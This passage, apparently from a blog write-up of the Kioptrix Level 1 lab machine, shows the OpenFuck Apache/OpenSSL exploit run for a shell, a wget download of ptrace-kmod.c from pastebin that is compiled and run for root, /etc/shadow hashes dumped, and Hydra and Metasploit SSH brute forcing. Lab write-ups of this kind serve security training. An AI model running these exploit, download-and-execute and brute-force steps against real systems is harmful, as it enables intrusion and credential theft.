by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *</span><br><span class="line">* <span class="comment">#hackarena  irc.brasnet.org                                     *</span></span><br><span class="line">* TNX Xanthic USG <span class="comment">#SilverLords #BloodBR #isotk #highsecure #uname *</span></span><br><span class="line">* <span class="comment">#ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span></span><br><span class="line">* <span class="comment">#pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</span></span><br><span class="line">*******************************************************************</span><br><span class="line"></span><br><span class="line">: Usage: ./OpenFuck target box [port] [-c N]</span><br><span class="line"></span><br><span class="line">  target - supported box eg: 0x00</span><br><span class="line">  box - hostname or IP address</span><br><span class="line">  port - port <span class="keyword">for</span> ssl connection</span><br><span class="line">  -c open N connections. (use range 40-50 <span class="keyword">if</span> u dont know)</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  Supported OffSet:</span><br><span class="line">        0x00 - Caldera OpenLinux (apache-1.3.26)</span><br><span class="line">        0x01 - Cobalt Sun 6.0 (apache-1.3.12)</span><br><span class="line">        0x02 - Cobalt Sun 6.0 (apache-1.3.20)</span><br><span class="line">        0x03 - Cobalt Sun x (apache-1.3.26)</span><br><span class="line">        0x04 - Cobalt Sun x Fixed2 (apache-1.3.26)</span><br><span class="line">        0x05 - Conectiva 4 (apache-1.3.6)</span><br><span class="line">        0x06 - Conectiva 4.1 (apache-1.3.9)</span><br><span class="line">        0x07 - Conectiva 6 (apache-1.3.14)</span><br><span class="line">        0x08 - Conectiva 7 (apache-1.3.12)</span><br><span class="line">        0x09 - Conectiva 7 (apache-1.3.19)</span><br><span class="line">        0x0a - Conectiva 7/8 (apache-1.3.26)</span><br><span class="line">        0x0b - Conectiva 8 (apache-1.3.22)</span><br><span class="line">        0x0c - Debian GNU Linux 2.2 Potato (apache_1.3.9-14.1)</span><br><span class="line">        0x0d - Debian GNU Linux (apache_1.3.19-1)</span><br><span class="line">        0x0e - Debian GNU Linux (apache_1.3.22-2)</span><br><span class="line">        0x0f - Debian GNU Linux (apache-1.3.22-2.1)</span><br><span class="line">        0x10 - Debian GNU Linux (apache-1.3.22-5)</span><br><span class="line">        0x11 - Debian GNU Linux (apache_1.3.23-1)</span><br><span class="line">        0x12 - Debian GNU Linux (apache_1.3.24-2.1)</span><br><span class="line">        0x13 - Debian Linux GNU Linux 2 (apache_1.3.24-2.1)</span><br><span class="line">        0x14 - Debian GNU Linux (apache_1.3.24-3)</span><br><span class="line">        0x15 - Debian GNU Linux (apache-1.3.26-1)</span><br><span class="line">        0x16 - Debian GNU Linux 3.0 Woody (apache-1.3.26-1)</span><br><span class="line">        0x17 - Debian GNU Linux (apache-1.3.27)</span><br><span class="line">        0x18 - FreeBSD (apache-1.3.9)</span><br><span class="line">        0x19 - FreeBSD (apache-1.3.11)</span><br><span class="line">        0x1a - FreeBSD (apache-1.3.12.1.40)</span><br><span class="line">        0x1b - FreeBSD (apache-1.3.12.1.40)</span><br><span class="line">        0x1c - FreeBSD (apache-1.3.12.1.40)</span><br><span class="line">        0x1d - FreeBSD (apache-1.3.12.1.40_1)</span><br><span class="line">        0x1e - FreeBSD (apache-1.3.12)</span><br><span class="line">        0x1f - FreeBSD (apache-1.3.14)</span><br><span class="line">        0x20 - FreeBSD (apache-1.3.14)</span><br><span class="line">        0x21 - FreeBSD (apache-1.3.14)</span><br><span class="line">        0x22 - FreeBSD (apache-1.3.14)</span><br><span class="line">        0x23 - FreeBSD (apache-1.3.14)</span><br><span class="line">        0x24 - FreeBSD (apache-1.3.17_1)</span><br><span class="line">        0x25 - FreeBSD (apache-1.3.19)</span><br><span class="line">        0x26 - FreeBSD (apache-1.3.19_1)</span><br><span class="line">        0x27 - FreeBSD (apache-1.3.20)</span><br><span class="line">        0x28 - FreeBSD (apache-1.3.20)</span><br><span class="line">        0x29 - FreeBSD (apache-1.3.20+2.8.4)</span><br><span class="line">        0x2a - FreeBSD (apache-1.3.20_1)</span><br><span class="line">        0x2b - FreeBSD (apache-1.3.22)</span><br><span class="line">        0x2c - FreeBSD (apache-1.3.22_7)</span><br><span class="line">        0x2d - FreeBSD (apache_fp-1.3.23)</span><br><span class="line">        0x2e - FreeBSD (apache-1.3.24_7)</span><br><span class="line">        0x2f - FreeBSD (apache-1.3.24+2.8.8)</span><br><span class="line">        0x30 - FreeBSD 4.6.2-Release-p6 (apache-1.3.26)</span><br><span class="line">        0x31 - FreeBSD 4.6-Realease (apache-1.3.26)</span><br><span class="line">        0x32 - FreeBSD (apache-1.3.27)</span><br><span class="line">        0x33 - Gentoo Linux (apache-1.3.24-r2)</span><br><span class="line">        0x34 - Linux Generic (apache-1.3.14)</span><br><span class="line">        0x35 - Mandrake Linux X.x (apache-1.3.22-10.1mdk)</span><br><span class="line">        0x36 - Mandrake Linux 7.1 (apache-1.3.14-2)</span><br><span class="line">        0x37 - Mandrake Linux 7.1 (apache-1.3.22-1.4mdk)</span><br><span class="line">        0x38 - Mandrake Linux 7.2 (apache-1.3.14-2mdk)</span><br><span class="line">        0x39 - Mandrake Linux 7.2 (apache-1.3.14) 2</span><br><span class="line">        0x3a - Mandrake Linux 7.2 (apache-1.3.20-5.1mdk)</span><br><span class="line">        0x3b - Mandrake Linux 7.2 (apache-1.3.20-5.2mdk)</span><br><span class="line">        0x3c - Mandrake Linux 7.2 (apache-1.3.22-1.3mdk)</span><br><span class="line">        0x3d - Mandrake Linux 7.2 (apache-1.3.22-10.2mdk)</span><br><span class="line">        0x3e - Mandrake Linux 8.0 (apache-1.3.19-3)</span><br><span class="line">        0x3f - Mandrake Linux 8.1 (apache-1.3.20-3)</span><br><span class="line">        0x40 - Mandrake Linux 8.2 (apache-1.3.23-4)</span><br><span class="line">        0x41 - Mandrake Linux 8.2 <span class="comment">#2 (apache-1.3.23-4)</span></span><br><span class="line">        0x42 - Mandrake Linux 8.2 (apache-1.3.24)</span><br><span class="line">        0x43 - Mandrake Linux 9 (apache-1.3.26)</span><br><span class="line">        0x44 - RedHat Linux ?.? GENERIC (apache-1.3.12-1)</span><br><span class="line">        0x45 - RedHat Linux TEST1 (apache-1.3.12-1)</span><br><span class="line">        0x46 - RedHat Linux TEST2 (apache-1.3.12-1)</span><br><span class="line">        0x47 - RedHat Linux GENERIC (marumbi) (apache-1.2.6-5)</span><br><span class="line">        0x48 - RedHat Linux 4.2 (apache-1.1.3-3)</span><br><span class="line">        0x49 - RedHat Linux 5.0 (apache-1.2.4-4)</span><br><span class="line">        0x4a - RedHat Linux 5.1-Update (apache-1.2.6)</span><br><span class="line">        0x4b - RedHat Linux 5.1 (apache-1.2.6-4)</span><br><span class="line">        0x4c - RedHat Linux 5.2 (apache-1.3.3-1)</span><br><span class="line">        0x4d - RedHat Linux 5.2-Update (apache-1.3.14-2.5.x)</span><br><span class="line">        0x4e - RedHat Linux 6.0 (apache-1.3.6-7)</span><br><span class="line">        0x4f - RedHat Linux 6.0 (apache-1.3.6-7)</span><br><span class="line">        0x50 - RedHat Linux 6.0-Update (apache-1.3.14-2.6.2)</span><br><span class="line">        0x51 - RedHat Linux 6.0 Update (apache-1.3.24)</span><br><span class="line">        0x52 - RedHat Linux 6.1 (apache-1.3.9-4)1</span><br><span class="line">        0x53 - RedHat Linux 6.1 (apache-1.3.9-4)2</span><br><span class="line">        0x54 - RedHat Linux 6.1-Update (apache-1.3.14-2.6.2)</span><br><span class="line">        0x55 - RedHat Linux 6.1-fp2000 (apache-1.3.26)</span><br><span class="line">        0x56 - RedHat Linux 6.2 (apache-1.3.12-2)1</span><br><span class="line">        0x57 - RedHat Linux 6.2 (apache-1.3.12-2)2</span><br><span class="line">        0x58 - RedHat Linux 6.2 mod(apache-1.3.12-2)3</span><br><span class="line">        0x59 - RedHat Linux 6.2 update (apache-1.3.22-5.6)1</span><br><span class="line">        0x5a - RedHat Linux 6.2-Update (apache-1.3.22-5.6)2</span><br><span class="line">        0x5b - Redhat Linux 7.x (apache-1.3.22)</span><br><span class="line">        0x5c - RedHat Linux 7.x (apache-1.3.26-1)</span><br><span class="line">        0x5d - RedHat Linux 7.x (apache-1.3.27)</span><br><span class="line">        0x5e - RedHat Linux 7.0 (apache-1.3.12-25)1</span><br><span class="line">        0x5f - RedHat Linux 7.0 (apache-1.3.12-25)2</span><br><span class="line">        0x60 - RedHat Linux 7.0 (apache-1.3.14-2)</span><br><span class="line">        0x61 - RedHat Linux 7.0-Update (apache-1.3.22-5.7.1)</span><br><span class="line">        0x62 - RedHat Linux 7.0-7.1 update (apache-1.3.22-5.7.1)</span><br><span class="line">        0x63 - RedHat Linux 7.0-Update (apache-1.3.27-1.7.1)</span><br><span class="line">        0x64 - RedHat Linux 7.1 (apache-1.3.19-5)1</span><br><span class="line">        0x65 - RedHat Linux 7.1 (apache-1.3.19-5)2</span><br><span class="line">        0x66 - RedHat Linux 7.1-7.0 update (apache-1.3.22-5.7.1)</span><br><span class="line">        0x67 - RedHat Linux 7.1-Update (1.3.22-5.7.1)</span><br><span class="line">        0x68 - RedHat Linux 7.1 (apache-1.3.22-src)</span><br><span class="line">        0x69 - RedHat Linux 7.1-Update (1.3.27-1.7.1)</span><br><span class="line">        0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1</span><br><span class="line">        **0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2**</span><br><span class="line">        0x6c - RedHat Linux 7.2-Update (apache-1.3.22-6)</span><br><span class="line">        0x6d - RedHat Linux 7.2 (apache-1.3.24)</span><br><span class="line">        0x6e - RedHat Linux 7.2 (apache-1.3.26)</span><br><span class="line">        0x6f - RedHat Linux 7.2 (apache-1.3.26-snc)</span><br><span class="line">        0x70 - Redhat Linux 7.2 (apache-1.3.26 w/PHP)1</span><br><span class="line">        0x71 - Redhat Linux 7.2 (apache-1.3.26 w/PHP)2</span><br><span class="line">        0x72 - RedHat Linux 7.2-Update (apache-1.3.27-1.7.2)</span><br><span class="line">        0x73 - RedHat Linux 7.3 (apache-1.3.23-11)1</span><br><span class="line">        0x74 - RedHat Linux 7.3 (apache-1.3.23-11)2</span><br><span class="line">        0x75 - RedHat Linux 7.3 (apache-1.3.27)</span><br><span class="line">        0x76 - RedHat Linux 8.0 (apache-1.3.27)</span><br><span class="line">        0x77 - RedHat Linux 8.0-second (apache-1.3.27)</span><br><span class="line">        0x78 - RedHat Linux 8.0 (apache-2.0.40)</span><br><span class="line">        0x79 - Slackware Linux 4.0 (apache-1.3.6)</span><br><span class="line">        0x7a - Slackware Linux 7.0 (apache-1.3.9)</span><br><span class="line">        0x7b - Slackware Linux 7.0 (apache-1.3.26)</span><br><span class="line">        0x7c - Slackware 7.0  (apache-1.3.26)2</span><br><span class="line">        0x7d - Slackware Linux 7.1 (apache-1.3.12)</span><br><span class="line">        0x7e - Slackware Linux 8.0 (apache-1.3.20)</span><br><span class="line">        0x7f - Slackware Linux 8.1 (apache-1.3.24)</span><br><span class="line">        0x80 - Slackware Linux 8.1 (apache-1.3.26)</span><br><span class="line">        0x81 - Slackware Linux 8.1-stable (apache-1.3.26)</span><br><span class="line">        0x82 - Slackware Linux (apache-1.3.27)</span><br><span class="line">        0x83 - SuSE Linux 7.0 (apache-1.3.12)</span><br><span class="line">        0x84 - SuSE Linux 7.1 (apache-1.3.17)</span><br><span class="line">        0x85 - SuSE Linux 7.2 (apache-1.3.19)</span><br><span class="line">        0x86 - SuSE Linux 7.3 (apache-1.3.20)</span><br><span class="line">        0x87 - SuSE Linux 8.0 (apache-1.3.23)</span><br><span class="line">        0x88 - SUSE Linux 8.0 (apache-1.3.23-120)</span><br><span class="line">        0x89 - SuSE Linux 8.0 (apache-1.3.23-137)</span><br><span class="line">        0x8a - Yellow Dog Linux/PPC 2.3 (apache-1.3.22-6.2.3a)</span><br><span class="line"></span><br><span class="line">Fuck to all guys <span class="built_in">who</span> like use lamah ddos. Read SRC to have no surprise</span><br></pre></td></tr></table></figure>
<ul>
<li>找到了符合版本可以進行利用的offset</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/opt/OpenFuck]</span><br><span class="line">└─# ./OpenFuck 0x6b 192.168.19.140 -c 40     </span><br><span class="line"></span><br><span class="line">*******************************************************************</span><br><span class="line">* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *</span><br><span class="line">*******************************************************************</span><br><span class="line">* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *</span><br><span class="line">* <span class="comment">#hackarena  irc.brasnet.org                                     *</span></span><br><span class="line">* TNX Xanthic USG <span class="comment">#SilverLords #BloodBR #isotk #highsecure #uname *</span></span><br><span class="line">* <span class="comment">#ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span></span><br><span class="line">* <span class="comment">#pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</span></span><br><span class="line">*******************************************************************</span><br><span class="line"></span><br><span class="line">Connection... 40 of 40</span><br><span class="line">Establishing SSL connection</span><br><span class="line">cipher: 0x4043808c   ciphers: 0x80f80e0</span><br><span class="line">Ready to send shellcode</span><br><span class="line">Spawning shell...</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">bash-2.05$ </span><br><span class="line">race-kmod.c; gcc -o p ptrace-kmod.c; <span class="built_in">rm</span> ptrace-kmod.c; ./p; m/raw/C7v25Xr9 -O pt </span><br><span class="line">--04:46:23--  https://pastebin.com/raw/C7v25Xr9</span><br><span class="line">           =&gt; `ptrace-kmod.c<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Connecting to pastebin.com:443... connected!</span></span><br><span class="line"><span class="string">HTTP request sent, awaiting response... 200 OK</span></span><br><span class="line"><span class="string">Length: unspecified [text/plain]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    0K ...                                                    @   3.84 MB/s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">04:46:24 (3.84 MB/s) - `ptrace-kmod.c&#x27;</span> saved [4026]</span><br><span class="line"></span><br><span class="line">ptrace-kmod.c:183:1: warning: no newline at end of file</span><br><span class="line">[+] Attached to 6630</span><br><span class="line">[+] Waiting <span class="keyword">for</span> signal</span><br><span class="line">[+] Signal caught</span><br><span class="line">[+] Shellcode placed at 0x4001189d</span><br><span class="line">[+] Now <span class="built_in">wait</span> <span class="keyword">for</span> suid shell...</span><br><span class="line"></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line"></span><br><span class="line">hostname</span><br><span class="line">kioptrix.level1</span><br><span class="line"></span><br><span class="line">locate flag</span><br><span class="line">/usr/sbin/rootflags</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/api_c/db_set_flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/api_c/env_set_flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/api_cxx/db_set_flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/api_cxx/env_set_flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/api_java/db_set_flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/api_java/env_set_flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/ref/build_unix/flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/ref/upgrade.3.2/set_flags.html</span><br><span class="line">/usr/share/man/man3/fegetexceptflag.3.gz</span><br><span class="line">/usr/share/man/man3/fesetexceptflag.3.gz</span><br><span class="line">/usr/share/man/man3/tgetflag.3x.gz</span><br><span class="line">/usr/share/man/man3/tigetflag.3x.gz</span><br><span class="line">/usr/share/man/man8/rootflags.8.gz</span><br><span class="line">/usr/include/bits/waitflags.h</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /usr/sbin/rootflags</span><br><span class="line">ELhP�A�q��.u�V����������P�s������jatus)Z</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line">User root may run the following commands on this host:</span><br><span class="line">    (ALL) ALL</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:5:0:<span class="built_in">sync</span>:/sbin:/bin/sync</span><br><span class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><br><span class="line">news:x:9:13:news:/var/spool/news:</span><br><span class="line">uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin</span><br><span class="line">operator:x:11:0:operator:/root:/sbin/nologin</span><br><span class="line">games:x:12:100:games:/usr/games:/sbin/nologin</span><br><span class="line">gopher:x:13:30:gopher:/var/gopher:/sbin/nologin</span><br><span class="line">ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</span><br><span class="line">nobody:x:99:99:Nobody:/:/sbin/nologin</span><br><span class="line">mailnull:x:47:47::/var/spool/mqueue:/dev/null</span><br><span class="line">rpm:x:37:37::/var/lib/rpm:/bin/bash</span><br><span class="line">xfs:x:43:43:X Font Server:/etc/X11/fs:/bin/false</span><br><span class="line">rpc:x:32:32:Portmapper RPC user:/:/bin/false</span><br><span class="line">rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin</span><br><span class="line">nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin</span><br><span class="line">nscd:x:28:28:NSCD Daemon:/:/bin/false</span><br><span class="line">ident:x:98:98:pident user:/:/sbin/nolcat /etc/passwd</span><br><span class="line">ogin</span><br><span class="line">radvd:x:75:75:radvd user:/:/bin/false</span><br><span class="line">postgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/bin/bash</span><br><span class="line">apache:x:48:48:Apache:/var/www:/bin/false</span><br><span class="line">squid:x:23:23::/var/spool/squid:/dev/null</span><br><span class="line">pcap:x:77:77::/var/arpwatch:/bin/nologin</span><br><span class="line">john:x:500:500::/home/john:/bin/bash</span><br><span class="line">harold:x:501:501::/home/harold:/bin/bash</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/shadow</span><br><span class="line">root:$1$XROmcfDX<span class="variable">$tF93GqnLHOJeGRHpaNyIs0</span>:14513:0:99999:7:::</span><br><span class="line">bin:*:14513:0:99999:7:::</span><br><span class="line">daemon:*:14513:0:99999:7:::</span><br><span class="line">adm:*:14513:0:99999:7:::</span><br><span class="line">lp:*:14513:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:14513:0:99999:7:::</span><br><span class="line">shutdown:*:14513:0:99999:7:::</span><br><span class="line">halt:*:14513:0:99999:7:::</span><br><span class="line">mail:*:14513:0:99999:7:::</span><br><span class="line">news:*:14513:0:99999:7:::</span><br><span class="line">uucp:*:14513:0:99999:7:::</span><br><span class="line">operator:*:14513:0:99999:7:::</span><br><span class="line">games:*:14513:0:99999:7:::</span><br><span class="line">gopher:*:14513:0:99999:7:::</span><br><span class="line">ftp:*:14513:0:99999:7:::</span><br><span class="line">nobody:*:14513:0:99999:7:::</span><br><span class="line">mailnull:!!:14513:0:99999:7:::</span><br><span class="line">rpm:!!:14513:0:99999:7:::</span><br><span class="line">xfs:!!:14513:0:99999:7:::</span><br><span class="line">rpc:!!:14513:0:99999:7:::</span><br><span class="line">rpcuser:!!:14513:0:99999:7:::</span><br><span class="line">nfsnobody:!!:14513:0:99999:7:::</span><br><span class="line">nscd:!!:14513:0:99999:7:::</span><br><span class="line">ident:!!:14513:0:99999:7:::</span><br><span class="line">radvd:!!:14513:0:99999:7:::</span><br><span class="line">postgres:!!:14513:0:99999:7:::</span><br><span class="line">apache:!!:14513:0:99999:7:::</span><br><span class="line">squid:!!:14513:0:99999:7:::</span><br><span class="line">pcap:!!:14513:0:99999:7:::</span><br><span class="line">john:$1<span class="variable">$zL4</span>.MR4t<span class="variable">$26N4YpTGceBO0gTX6TAky1</span>:14513:0:99999:7:::</span><br><span class="line">harold:$1$Xx6dZdOd<span class="variable">$IMOGACl3r757dv17LZ9010</span>:14513:0:99999:7:::</span><br></pre></td></tr></table></figure>
<ul>
<li>通過root身分可以看到不少機敏資訊</li>
</ul>
<h3 id="Brute-Force-Attacks"><a href="#Brute-Force-Attacks" class="headerlink" title="Brute Force Attacks"></a><strong>Brute Force Attacks</strong></h3><p>從現實角度出發</p>
<ul>
<li>評估中看到SSH，嘗試對其進行暴力破解，或默認憑據<ul>
<li>測試密碼強度</li>
<li>弱密碼、默認密碼</li>
</ul>
</li>
<li><p>確認藍隊的表現</p>
<ul>
<li>評估對方是否能偵測到攻擊</li>
<li>攻擊是否有告警</li>
</ul>
</li>
<li><p>hydra - SSH 錯誤</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.19.140:22 -t 4 -V**</span><br><span class="line">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-14 16:23:58</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 1009 login tries (l:1/p:1009), ~253 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.19.140:22/</span><br><span class="line">[ERROR] could not connect to ssh://192.168.19.140:22 - kex error : no match <span class="keyword">for</span> method server host key algo: server [ssh-rsa,ssh-dss], client [ssh-ed25519,ecdsa-sha2-nistp521,ecdsa-sha2-nistp384,ecdsa-sha2-nistp256,sk-ssh-ed25519@openssh.com,sk-ecdsa-sha2-nistp256@openssh.com,rsa-sha2-512,rsa-sha2-256]</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# apt update&amp;&amp; apt full-upgrade -y</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# dpkg -l | grep kali-tweaks</span><br><span class="line">ii  kali-tweaks                                    2023.3.2                                all          tool to adjust advanced configuration settings <span class="keyword">for</span> Kali Linux</span><br><span class="line">                                                                                                                                       </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# kali-tweaks  </span><br><span class="line">&gt;&gt;&gt; Configuring Samba</span><br><span class="line">&gt; Setting client min protocol to: LANMAN1</span><br><span class="line">&gt; Writing changes to /etc/samba/smb.conf</span><br><span class="line">&gt;&gt;&gt; Configuring SSH</span><br><span class="line">&gt; Enabling wide compatibility</span><br><span class="line">&gt; $ <span class="built_in">cp</span> -f /usr/share/kali-defaults/etc/ssh/ssh_config.d/kali-wide-compat.conf /etc/ssh/ssh_config.d/kali-wide-compat.conf</span><br><span class="line"></span><br><span class="line">┏━(Message from Kali developers)</span><br><span class="line">┃ For more information about Samba configuration, please refer to:</span><br><span class="line">┃ https://www.kali.org/docs/general-use/samba-configuration/</span><br><span class="line">┃ For more information about SSH configuration, please refer to:</span><br><span class="line">┃ https://www.kali.org/docs/general-use/ssh-configuration/</span><br><span class="line">┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span><br><span class="line"></span><br><span class="line">&gt; Press Enter to <span class="built_in">continue</span>...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>  enter &gt; 選SSH client &gt; OK</p>
<p>  <img src="img/exploit_Untitled_4.png" alt="Untitled"></p>
<p>  會需要再輸入一次</p>
<p>  <img src="img/exploit_Untitled_5.png" alt="Untitled"></p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.19.140:22 -t 4 -V</span><br></pre></td></tr></table></figure>
<p>同時開啟MSF，選擇需要的模塊並將選項中的參數填入，執行程式</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Metasploit Documentation: https://docs.metasploit.com/</span><br><span class="line"></span><br><span class="line">msf6 &gt; **search ssh**</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#   Name                                                              Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -   ----                                                              ---------------  ----       -----  -----------</span><br><span class="line">   0   exploit/linux/http/alienvault_exec                                2017-01-31       excellent  Yes    AlienVault OSSIM/USM Remote Code Execution</span><br><span class="line">   1   auxiliary/scanner/ssh/apache_karaf_command_execution              2016-02-09       normal     No     Apache Karaf Default Credentials Command Execution</span><br><span class="line">   2   auxiliary/scanner/ssh/karaf_login                                                  normal     No     Apache Karaf Login Utility</span><br><span class="line">   3   exploit/apple_ios/ssh/cydia_default_ssh                           2007-07-02       excellent  No     Apple iOS Default SSH Password Vulnerability                                                                                                    </span><br><span class="line">   4   exploit/unix/ssh/arista_tacplus_shell                             2020-02-02       great      Yes    Arista restricted shell escape (with privesc)</span><br><span class="line">   5   exploit/unix/ssh/array_vxag_vapv_privkey_privesc                  2014-02-03       excellent  No     Array Networks vAPV and vxAG Private Key Privilege Escalation Code Execution</span><br><span class="line">   6   exploit/linux/ssh/ceragon_fibeair_known_privkey                   2015-04-01       excellent  No     Ceragon FibeAir IP-10 SSH Private Key Exposure</span><br><span class="line">   7   auxiliary/scanner/ssh/cerberus_sftp_enumusers                     2014-05-27       normal     No     Cerberus FTP Server SFTP Username Enumeration</span><br><span class="line">....</span><br><span class="line">   43  exploit/linux/ssh/quantum_dxi_known_privkey                       2014-03-17       excellent  No     Quantum DXi V1000 SSH Private Key Exposure                                                                                                      </span><br><span class="line">   44  exploit/linux/ssh/quantum_vmpro_backdoor                          2014-03-17       excellent  No     Quantum vmPRO Backdoor Command</span><br><span class="line">   45  auxiliary/fuzzers/ssh/ssh_version_15                                               normal     No     SSH 1.5 Version Fuzzer</span><br><span class="line">   46  auxiliary/fuzzers/ssh/ssh_version_2                                                normal     No     SSH 2.0 Version Fuzzer</span><br><span class="line">   47  auxiliary/fuzzers/ssh/ssh_kexinit_corrupt                                          normal     No     SSH Key Exchange Init Corruption</span><br><span class="line">   48  post/linux/manage/sshkey_persistence                                               excellent  No     SSH Key Persistence</span><br><span class="line">   49  post/windows/manage/sshkey_persistence                                             good       No     SSH Key Persistence</span><br><span class="line">   **50  auxiliary/scanner/ssh/ssh_login                                                    normal     No     SSH Login Check Scanner**</span><br><span class="line">   51  auxiliary/scanner/ssh/ssh_identify_pubkeys                                         normal     No     SSH Public Key Acceptance Scanner</span><br><span class="line">   52  auxiliary/scanner/ssh/ssh_login_pubkey                                             normal     No     SSH Public Key Login Scanner</span><br><span class="line">   53  exploit/multi/ssh/sshexec                                         1999-01-01       manual     No     SSH User Code Execution</span><br><span class="line">   54  auxiliary/scanner/ssh/ssh_enumusers                                                normal     No     SSH Username Enumeration</span><br><span class="line">   55  auxiliary/fuzzers/ssh/ssh_version_corrupt                                          normal     No     SSH Version Corruption</span><br><span class="line">   56  auxiliary/scanner/ssh/ssh_version                                                  normal     No     SSH Version Scanner</span><br><span class="line">.....</span><br><span class="line">   70  payload/cmd/unix/bind_aws_instance_connect                                         normal     No     Unix SSH Shell, Bind Instance Connect (via AWS API)</span><br><span class="line">   71  exploit/linux/ssh/vmware_vrni_known_privkey                       2023-08-29       excellent  No     VMWare Aria Operations <span class="keyword">for</span> Networks (vRealize Network Insight) SSH Private Key Exposure</span><br><span class="line">   72  exploit/linux/ssh/vmware_vdp_known_privkey                        2016-12-20       excellent  No     VMware VDP Known SSH Key                                                                                                                        </span><br><span class="line">   73  exploit/multi/http/vmware_vcenter_uploadova_rce                   2021-02-23       manual     Yes    VMware vCenter Server Unauthenticated OVA File Upload RCE</span><br><span class="line">   74  exploit/linux/ssh/vyos_restricted_shell_privesc                   2018-11-05       great      Yes    VyOS restricted-shell Escape and Privilege Escalation</span><br><span class="line">   75  post/windows/gather/credentials/whatsupgold_credential_dump       2022-11-22       manual     No     WhatsUp Gold Credentials Dump</span><br><span class="line">   76  post/windows/gather/credentials/mremote                                            normal     No     Windows Gather mRemote Saved Password Extraction</span><br><span class="line">   77  exploit/windows/local/unquoted_service_path                       2001-10-25       great      Yes    Windows Unquoted Service Path Privilege Escalation</span><br><span class="line">   78  exploit/linux/http/zyxel_lfi_unauth_ssh_rce                       2022-02-01       excellent  Yes    Zyxel chained RCE using LFI and weak password derivation algorithm</span><br><span class="line">   79  auxiliary/scanner/ssh/libssh_auth_bypass                          2018-10-16       normal     No     libssh Authentication Bypass Scanner</span><br><span class="line">   80  exploit/linux/http/php_imap_open_rce                              2018-10-23       good       Yes    php imap_open Remote Code Execution</span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 80, use 80 or use exploit/linux/http/php_imap_open_rce</span><br><span class="line"></span><br><span class="line">msf6 &gt; use 50</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/ssh/ssh_login):</span><br><span class="line"></span><br><span class="line">   Name              Current Setting  Required  Description</span><br><span class="line">   ----              ---------------  --------  -----------</span><br><span class="line">   ANONYMOUS_LOGIN   <span class="literal">false</span>          